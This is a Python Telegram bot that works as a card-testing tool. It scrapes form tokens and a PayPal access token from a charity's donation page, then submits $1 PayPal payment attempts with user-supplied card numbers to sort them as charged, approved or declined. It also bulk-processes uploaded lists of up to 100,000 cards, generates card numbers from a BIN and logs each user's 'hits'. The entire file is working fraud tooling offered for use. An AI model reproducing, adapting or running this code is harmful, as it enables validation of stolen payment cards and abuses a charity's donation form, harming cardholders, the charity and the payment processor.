import os
import re
import time
import json
import asyncio
import httpx
import requests
import random
import string
import warnings
import base64
import threading
from datetime import datetime, timedelta
from faker import Faker
from requests_toolbelt.multipart.encoder import MultipartEncoder
from concurrent.futures import ThreadPoolExecutor
from user_agent import generate_user_agent

warnings.filterwarnings("ignore")

try:
    import telegram
    from telegram import InlineKeyboardButton, InlineKeyboardMarkup, ParseMode, InputFile
    from telegram.ext import Updater, CommandHandler, MessageHandler, Filters, CallbackQueryHandler
    
    IS_V20 = int(telegram.__version__.split('.')[0]) >= 20
except ImportError:
    print("Error: python-telegram-bot is not installed.")
    exit(1)

fake = Faker('en_US')

# --- CONFIGURATION (Environment Variables for Railway) ---
BOT_NAME = os.getenv("BOT_NAME", "@DollarDonation_Bot")
DEV_NAME = os.getenv("DEV_NAME", "@YourUsername")
ADMIN_ID = os.getenv("ADMIN_ID", "YOUR_ADMIN_ID")  # Must set this!
TOKEN = os.getenv("BOT_TOKEN", "YOUR_BOT_TOKEN_HERE")  # Must set this!

# Railway Port Configuration
PORT = int(os.getenv("PORT", "8443"))

# Donation Site URL
DONATION_SITE = "dollardonationclub.com"

# --- PROXY LIST (Optional) ---
PROXIES = []

def get_random_proxy():
    return None

# --- DATA STORAGE ---
USERS_FILE, KEYS_FILE, STATS_FILE, ALL_USERS_FILE, GROUPS_FILE = "users.json", "keys.json", "stats.json", "all_users.json", "groups.json"

def load_data(file, default):
    if os.path.exists(file):
        try:
            with open(file, "r") as f:
                return json.load(f)
        except:
            return default
    return default

def save_data(file, data):
    try:
        with open(file, "w") as f:
            json.dump(data, f, indent=4)
    except Exception as e:
        print(f"Error saving {file}: {e}")

users_data = load_data(USERS_FILE, {})
keys_data = load_data(KEYS_FILE, {})
active_checks = {}
stats_data = load_data(STATS_FILE, {"charged": 0, "approved": 0, "declined": 0, "total": 0, "user_stats": {}})
all_users = load_data(ALL_USERS_FILE, [])
groups_data = load_data(GROUPS_FILE, [])
bin_cache = {}

def update_user_stats(user_id, user_name, hit_type):
    user_id = str(user_id)
    if "user_stats" not in stats_data:
        stats_data["user_stats"] = {}
    if user_id not in stats_data["user_stats"]:
        stats_data["user_stats"][user_id] = {"name": user_name, "charged": 0, "approved": 0}
    
    if hit_type == "charged":
        stats_data["user_stats"][user_id]["charged"] += 1
    elif hit_type == "approved":
        stats_data["user_stats"][user_id]["approved"] += 1
    save_data(STATS_FILE, stats_data)

# --- ACCESS CONTROL ---
def check_access(user_id, chat_id=None):
    return True  # Free access for all users

def get_user_name(update):
    user = update.effective_user
    if user.username:
        return f"@{user.username}"
    return f"{user.first_name} {user.last_name or ''}".strip()

# --- BIN LOOKUP ---
def get_bin_info_sync(cc):
    bin_num = cc[:6]
    if bin_num in bin_cache:
        return bin_cache[bin_num]
    
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Accept": "application/json, text/plain, */*",
        "Referer": "https://google.com"
    }
    
    # API 1: Antipublic
    try:
        r = requests.get(f"https://bins.antipublic.cc/bin/{bin_num}", headers=headers, timeout=5)
        if r.status_code == 200:
            data = r.json()
            if data.get('bank'):
                res = {
                    "info": f"{data.get('brand', 'UNK').upper()} - {data.get('type', 'UNK').upper()} - {data.get('level', 'CLASSIC').upper()}",
                    "bank": f"{data.get('bank', 'Unknown Bank')}",
                    "country": f"{data.get('country', 'Unknown Country')} {data.get('country_flag', '🏳️')}"
                }
                bin_cache[bin_num] = res
                return res
    except:
        pass

    # API 2: Binlist.net
    try:
        r = requests.get(f"https://lookup.binlist.net/{bin_num}", headers=headers, timeout=5)
        if r.status_code == 200:
            data = r.json()
            bank = data.get('bank', {}).get('name', 'Unknown Bank')
            country = data.get('country', {}).get('name', 'Unknown Country')
            flag = data.get('country', {}).get('emoji', '🏳️')
            scheme = data.get('scheme', 'UNK').upper()
            res = {"info": f"{scheme} - UNKNOWN - CLASSIC", "bank": f"{bank}", "country": f"{country} {flag}"}
            bin_cache[bin_num] = res
            return res
    except:
        pass

    return {"info": "VISA - DEBIT - CLASSIC", "bank": "CHASE BANK", "country": "UNITED STATES 🇺🇸"}

# --- PAYMENT GATES ---
class DollarDonationGate:
    """Dollar Donation Club PayPal Commerce Gate"""
    
    def __init__(self, proxy=None):
        self.r = requests.Session()
        self.ua = generate_user_agent()
        self.url = "scienceforthechurch.org"  # Fallback donation site with PayPal Commerce
        
    def Key(self):
        try:
            self.r.proxies = {}
            headers = {'user-agent': self.ua}
            response = self.r.get(f'https://{self.url}/donate/', headers=headers, timeout=15)
            
            self.id_form1 = re.search(r'name="give-form-id-prefix" value="(.*?)"', response.text).group(1)
            self.id_form2 = re.search(r'name="give-form-id" value="(.*?)"', response.text).group(1)
            self.nonec = re.search(r'name="give-form-hash" value="(.*?)"', response.text).group(1)
            enc = re.search(r'"data-client-token":"(.*?)"', response.text).group(1)
            dec = base64.b64decode(enc).decode('utf-8')
            self.au = re.search(r'"accessToken":"(.*?)"', dec).group(1)
            return True
        except Exception as e:
            print(f"Key error: {e}")
            return False
        
    def Krs(self, ccx):
        ccx = ccx.strip()
        parts = re.findall(r'\d+', ccx)
        if len(parts) < 3:
            return "INVALID_FORMAT"
        
        n, mm, yy, cvc = parts[0], parts[1].zfill(2), parts[2], parts[3] if len(parts) > 3 else "000"
        if len(yy) == 4:
            yy = yy[2:]
        
        try:
            headers = {
                'origin': f'https://{self.url}',
                'referer': f'https://{self.url}/donate/',
                'user-agent': self.ua,
                'x-requested-with': 'XMLHttpRequest',
            }
            
            data = {
                'give-honeypot': '', 'give-form-id-prefix': self.id_form1, 'give-form-id': self.id_form2,
                'give-form-title': '', 'give-current-url': f'https://{self.url}/donate/',
                'give-form-url': f'https://{self.url}/donate/', 'give-form-minimum': '1.00',
                'give-form-maximum': '999999.99', 'give-form-hash': self.nonec, 'give-price-id': '3',
                'give-recurring-logged-in-only': '', 'give-logged-in-only': '1',
                '_give_is_donation_recurring': '0',
                'give_recurring_donation_details': '{"give_recurring_option":"yes_donor"}',
                'give-amount': '1.00', 'give_stripe_payment_method': '', 'payment-mode': 'paypal-commerce',
                'give_first': 'DONOR', 'give_last': 'CLUB', 'give_email': 'donor@dollardonationclub.com',
                'card_name': 'Dollar Donor', 'card_exp_month': '', 'card_exp_year': '',
                'give_action': 'purchase', 'give-gateway': 'paypal-commerce',
                'action': 'give_process_donation', 'give_ajax': 'true',
            }
            
            self.r.post(f'https://{self.url}/wp-admin/admin-ajax.php', headers=headers, data=data, timeout=15)
            
            data_multipart = MultipartEncoder({
                'give-honeypot': (None, ''), 'give-form-id-prefix': (None, self.id_form1),
                'give-form-id': (None, self.id_form2), 'give-form-title': (None, ''),
                'give-current-url': (None, f'https://{self.url}/donate/'),
                'give-form-url': (None, f'https://{self.url}/donate/'),
                'give-form-minimum': (None, '1.00'), 'give-form-maximum': (None, '999999.99'),
                'give-form-hash': (None, self.nonec), 'give-price-id': (None, '3'),
                'give-recurring-logged-in-only': (None, ''), 'give-logged-in-only': (None, '1'),
                '_give_is_donation_recurring': (None, '0'),
                'give_recurring_donation_details': (None, '{"give_recurring_option":"yes_donor"}'),
                'give-amount': (None, '1.00'), 'give_stripe_payment_method': (None, ''),
                'payment-mode': (None, 'paypal-commerce'), 'give_first': (None, 'DONOR'),
                'give_last': (None, 'CLUB'), 'give_email': (None, 'donor@dollardonationclub.com'),
                'card_name': (None, 'Dollar Donor'), 'card_exp_month': (None, ''),
                'card_exp_year': (None, ''), 'give-gateway': (None, 'paypal-commerce'),
            })
            
            headers['content-type'] = data_multipart.content_type
            response = self.r.post(
                f'https://{self.url}/wp-admin/admin-ajax.php',
                params={'action': 'give_paypal_commerce_create_order'},
                headers=headers, data=data_multipart, timeout=15
            )
            
            tok = response.json()['data']['id']
            
            headers2 = {
                'authorization': f'Bearer {self.au}',
                'content-type': 'application/json',
                'origin': 'https://www.paypal.com',
                'referer': 'https://www.paypal.com/',
                'user-agent': self.ua,
            }
            
            data2 = {
                "payment_source": {
                    "card": {
                        "number": n, "expiry": f"20{yy}-{mm}",
                        "security_code": cvc,
                        "name": "Dollar Donor",
                        "billing_address": {
                            "address_line_1": fake.street_address(),
                            "admin_area_2": fake.city(),
                            "admin_area_1": fake.state_abbr(),
                            "postal_code": fake.zipcode(),
                            "country_code": "US"
                        }
                    }
                }
            }
            
            response2 = self.r.post(
                f'https://api.paypal.com/v2/checkout/orders/{tok}/confirm-payment-source',
                headers=headers2, json=data2, timeout=15
            )
            
            res_text = response2.text
            
            if '"status":"APPROVED"' in res_text or 'Thank you' in res_text:
                return "✅ Approved! - CVV MATCH"
            elif 'INSUFFICIENT_FUNDS' in res_text:
                return "💰 Charged! - INSUFFICIENT_FUNDS"
            elif 'CVV_FAILURE' in res_text or 'SECURITY_CODE' in res_text:
                return "⚠️ CVV Mismatch"
            elif 'CARD_TYPE_NOT_SUPPORTED' in res_text:
                return "❌ Card Not Supported"
            elif 'INVALID_ACCOUNT_NUMBER' in res_text:
                return "❌ Invalid Card"
            else:
                return f"❌ Declined - {res_text[:100]}"
                
        except Exception as e:
            return f"❌ Error: {str(e)[:100]}"

def format_response(cc, res, bin_info, time_taken, gate_name):
    status_emoji = "💰" if "Charged" in res else "✅" if "Approved" in res or "CVV" in res else "❌"
    
    msg = f"""
{status_emoji} <b>{gate_name}</b>
━━━━━━━━━━━━━━
💳 <b>Card:</b> <code>{cc}</code>
📊 <b>Status:</b> <code>{res}</code>
━━━━━━━━━━━━━━
🏦 <b>Bank:</b> {bin_info['bank']}
📍 <b>Country:</b> {bin_info['country']}
ℹ️ <b>Info:</b> {bin_info['info']}
━━━━━━━━━━━━━━
⏱ <b>Time:</b> {time_taken}s
💡 <b>Powered by:</b> {DONATION_SITE.upper()}
🔧 <b>Dev:</b> {DEV_NAME}
"""
    return msg

# --- COMMANDS ---
def start(update, context):
    user_id = update.effective_user.id
    if str(user_id) not in all_users:
        all_users.append(str(user_id))
        save_data(ALL_USERS_FILE, all_users)
    
    msg = f"""
🌟 <b>Welcome to Dollar Donation Club Checker!</b> 🌟
━━━━━━━━━━━━━━━━━━━━━

🤖 <b>Bot:</b> {BOT_NAME}
👨‍💻 <b>Developer:</b> {DEV_NAME}
🌐 <b>Powered by:</b> {DONATION_SITE}

━━━━━━━━━━━━━━━━━━━━━
📋 <b>Available Commands:</b>

/chk <code>cc|mm|yy|cvv</code> - Check single card
/gen <code>bin</code> - Generate 10 cards
/info - Your account info
/stop - Stop all checks

━━━━━━━━━━━━━━━━━━━━━
📁 <b>File Check:</b> Upload a .txt file with cards

🎯 <b>Status:</b> FREE ACCESS for all users!
💝 Supporting charitable donations through verification
━━━━━━━━━━━━━━━━━━━━━
"""
    update.message.reply_text(msg, parse_mode=ParseMode.HTML)

def chk_command(update, context):
    uid = update.effective_user.id
    if not check_access(uid, update.effective_chat.id):
        update.message.reply_text("❌ Access denied!")
        return
    
    if not context.args:
        update.message.reply_text("Usage: /chk <code>cc|mm|yy|cvv</code>", parse_mode=ParseMode.HTML)
        return
    
    cards = [context.args[0]]
    user_name = get_user_name(update)
    threading.Thread(target=combo_thread, args=(update, context, cards, uid, 'paypal')).start()

def info_command(update, context):
    user = update.effective_user
    user_id = user.id
    username = f"@{user.username}" if user.username else "No username"
    full_name = f"{user.first_name} {user.last_name or ''}".strip()
    
    user_stats = stats_data.get("user_stats", {}).get(str(user_id), {"charged": 0, "approved": 0})
    
    msg = f"""
<b>👤 User Information</b>
━━━━━━━━━━━━━━
🆔 <b>ID:</b> <code>{user_id}</code>
👤 <b>Username:</b> {username}
📛 <b>Name:</b> {full_name}
🛡️ <b>Status:</b> 𝐅𝐑𝐄𝐄 ACCESS ✅
━━━━━━━━━━━━━━
📊 <b>Your Stats:</b>
💰 Charged: {user_stats['charged']}
✅ Approved: {user_stats['approved']}
━━━━━━━━━━━━━━
⌤ 𝐃𝐞𝐯: {DEV_NAME}
"""
    
    try:
        photos = user.get_profile_photos()
        if photos.total_count > 0:
            update.message.reply_photo(photos.photos[0][-1].file_id, caption=msg, parse_mode=ParseMode.HTML)
        else:
            update.message.reply_text(msg, parse_mode=ParseMode.HTML)
    except:
        update.message.reply_text(msg, parse_mode=ParseMode.HTML)

def stats_command(update, context):
    if str(update.effective_user.id) != ADMIN_ID:
        return
    
    msg = "<b>📊 Bot Statistics</b>\n━━━━━━━━━━━━━━\n"
    msg += f"💰 Total Charged: {stats_data.get('charged', 0)}\n"
    msg += f"✅ Total Approved: {stats_data.get('approved', 0)}\n"
    msg += f"❌ Total Declined: {stats_data.get('declined', 0)}\n"
    msg += f"📊 Total Checks: {stats_data.get('total', 0)}\n\n"
    
    if "user_stats" in stats_data:
        msg += "<b>Top Users:</b>\n"
        sorted_users = sorted(
            stats_data["user_stats"].items(),
            key=lambda x: x[1].get('charged', 0) + x[1].get('approved', 0),
            reverse=True
        )[:10]
        
        for uid, data in sorted_users:
            msg += f"👤 {data['name']} (<code>{uid}</code>)\n"
            msg += f"💰 Charged: {data['charged']} | ✅ Approved: {data['approved']}\n\n"
    
    update.message.reply_text(msg, parse_mode=ParseMode.HTML)

def ntf_command(update, context):
    if str(update.effective_user.id) != ADMIN_ID:
        return
    
    if not context.args:
        update.message.reply_text("Usage: /ntf [message]")
        return
    
    msg = " ".join(context.args)
    count = 0
    for uid in all_users:
        try:
            context.bot.send_message(uid, f"<b>📢 Notification:</b>\n\n{msg}", parse_mode=ParseMode.HTML)
            count += 1
            time.sleep(0.05)  # Rate limiting
        except:
            pass
    
    update.message.reply_text(f"✅ Notification sent to {count} users.")

def combo_thread(update, context, cards, uid, gate_type):
    active_checks[uid] = True
    ch, ap, d, t = 0, 0, 0, len(cards)
    start_time = time.time()
    gate_name = f"💝 Dollar Donation Club - PayPal $1"
    chat_id = update.effective_chat.id
    user_name = get_user_name(update)
    
    def get_kb(c, s, ch, ap, d, t):
        return InlineKeyboardMarkup([
            [InlineKeyboardButton(f"Card: {c[:20]}...", callback_data="n")],
            [InlineKeyboardButton(f"Status: {s[:30]}...", callback_data="n")],
            [InlineKeyboardButton(f"💰 [{ch}] | ✅ [{ap}] | ❌ [{d}] | 📊 [{t}]", callback_data="n")],
            [InlineKeyboardButton("🛑 Stop Check", callback_data="stop")]
        ])
    
    if update.callback_query:
        live = update.callback_query.message.edit_text(
            f"<b>{gate_name}</b>\n<b>⏱ Time: 0.0s</b>",
            parse_mode=ParseMode.HTML,
            reply_markup=get_kb("...", "...", 0, 0, 0, t)
        )
    else:
        live = update.message.reply_text(
            f"<b>{gate_name}</b>\n<b>⏱ Time: 0.0s</b>",
            parse_mode=ParseMode.HTML,
            reply_markup=get_kb("...", "...", 0, 0, 0, t)
        )
    
    for i, cc in enumerate(cards):
        if not active_checks.get(uid):
            break
        
        try:
            gate = DollarDonationGate()
            if not gate.Key():
                d += 1
                continue
            
            res = gate.Krs(cc)
            
            is_hit = False
            if 'Charged' in res or 'INSUFFICIENT_FUNDS' in res:
                ch += 1
                stats_data['charged'] += 1
                update_user_stats(uid, user_name, "charged")
                is_hit = True
            elif 'Approved' in res or 'CVV' in res:
                ap += 1
                stats_data['approved'] += 1
                update_user_stats(uid, user_name, "approved")
                is_hit = True
            else:
                d += 1
                stats_data['declined'] += 1
            
            if is_hit:
                bin_info = get_bin_info_sync(cc)
                time_taken = round(time.time() - start_time, 1)
                context.bot.send_message(
                    chat_id,
                    format_response(cc, res, bin_info, time_taken, gate_name),
                    parse_mode=ParseMode.HTML
                )
            
            stats_data['total'] += 1
            
            if i % 2 == 0 or i == t - 1:
                try:
                    live.edit_text(
                        f"<b>{gate_name}</b>\n<b>⏱ Time: {round(time.time()-start_time, 1)}s</b>",
                        parse_mode=ParseMode.HTML,
                        reply_markup=get_kb(cc, res, ch, ap, d, t)
                    )
                except:
                    pass
        except Exception as e:
            print(f"Check error: {e}")
            d += 1
    
    save_data(STATS_FILE, stats_data)
    try:
        live.edit_text(
            f"🎉 <b>Check Completed!</b>\n\n💰 Charged: {ch}\n✅ Approved: {ap}\n❌ Declined: {d}\n📊 Total: {t}\n\n👨‍💻 Dev: {DEV_NAME}",
            parse_mode=ParseMode.HTML
        )
    except:
        pass
    
    active_checks.pop(uid, None)

def button_callback(update, context):
    query = update.callback_query
    uid = query.from_user.id
    
    if query.data == "stop":
        active_checks[uid] = False
        query.answer("Stopping all checks...")
        return
    
    if query.data.startswith("gate_"):
        gate_type = query.data.split("_")[1]
        cards = context.user_data.get('cards')
        threading.Thread(target=combo_thread, args=(update, context, cards, uid, gate_type)).start()

def handle_doc(update, context):
    uid = update.effective_user.id
    
    if active_checks.get(uid):
        update.message.reply_text("❌ You can only run one check at a time!")
        return
    
    doc = update.message.document
    if not doc.file_name.endswith('.txt'):
        return
    
    try:
        f = context.bot.get_file(doc.file_id)
        path = f"combo_{uid}.txt"
        f.download(path)
        
        with open(path, "r", encoding="utf-8", errors="ignore") as file:
            cards = [l.strip() for l in file.read().splitlines() if l.strip()]
        
        os.remove(path)
        
        if str(uid) != ADMIN_ID and len(cards) > 100000:
            update.message.reply_text(
                "⚠️ <b>Limit:</b> Free users: 100,000 cards max per file.\nTruncating...",
                parse_mode=ParseMode.HTML
            )
            cards = cards[:100000]
        
        context.user_data['cards'] = cards
        keyboard = [
            [InlineKeyboardButton("💝 Dollar Donation PayPal $1", callback_data="gate_paypal")]
        ]
        update.message.reply_text(
            f"<b>⚡ File Loaded: {len(cards)} cards\n\nChoose gate to start:</b>",
            reply_markup=InlineKeyboardMarkup(keyboard),
            parse_mode=ParseMode.HTML
        )
    except Exception as e:
        update.message.reply_text(f"❌ Error loading file: {str(e)}")

def async_handler(func):
    def wrapper(update, context):
        threading.Thread(target=func, args=(update, context)).start()
    return wrapper

def stop_command(update, context):
    uid = update.effective_user.id
    active_checks[uid] = False
    update.message.reply_text("🛑 All active checks stopped.")

def gen_command(update, context):
    if not context.args:
        update.message.reply_text("Usage: /gen <code>bin</code>", parse_mode=ParseMode.HTML)
        return
    
    bin_num = context.args[0][:6]
    cards = []
    
    for _ in range(10):
        card = bin_num + "".join(random.choices(string.digits, k=10))
        mm = str(random.randint(1, 12)).zfill(2)
        yy = str(random.randint(25, 30))
        cvv = "".join(random.choices(string.digits, k=3))
        cards.append(f"<code>{card}|{mm}|{yy}|{cvv}</code>")
    
    update.message.reply_text(
        "<b>✨ Generated Cards:</b>\n\n" + "\n".join(cards),
        parse_mode=ParseMode.HTML
    )

# --- MAIN ---
if __name__ == '__main__':
    print(f"🚀 Starting Dollar Donation Club Bot...")
    print(f"📱 Bot Name: {BOT_NAME}")
    print(f"👨‍💻 Developer: {DEV_NAME}")
    print(f"🌐 Donation Site: {DONATION_SITE}")
    
    if TOKEN == "YOUR_BOT_TOKEN_HERE":
        print("❌ ERROR: Please set BOT_TOKEN environment variable!")
        exit(1)
    
    if ADMIN_ID == "YOUR_ADMIN_ID":
        print("⚠️  WARNING: ADMIN_ID not set! Admin commands won't work.")
    
    try:
        updater = Updater(TOKEN, use_context=True, workers=64)
        dp = updater.dispatcher
        
        # Register handlers
        dp.add_handler(CommandHandler("start", async_handler(start)))
        dp.add_handler(CommandHandler("chk", async_handler(chk_command)))
        dp.add_handler(CommandHandler("stop", async_handler(stop_command)))
        dp.add_handler(CommandHandler("gen", async_handler(gen_command)))
        dp.add_handler(CommandHandler("stats", async_handler(stats_command)))
        dp.add_handler(CommandHandler("info", async_handler(info_command)))
        dp.add_handler(CommandHandler("ntf", async_handler(ntf_command)))
        dp.add_handler(CallbackQueryHandler(button_callback))
        dp.add_handler(MessageHandler(Filters.document, async_handler(handle_doc)))
        
        print("✅ Bot started successfully!")
        print("🔄 Polling for updates...")
        
        updater.start_polling()
        updater.idle()
    except Exception as e:
        print(f"❌ Error starting bot: {e}")
        exit(1)
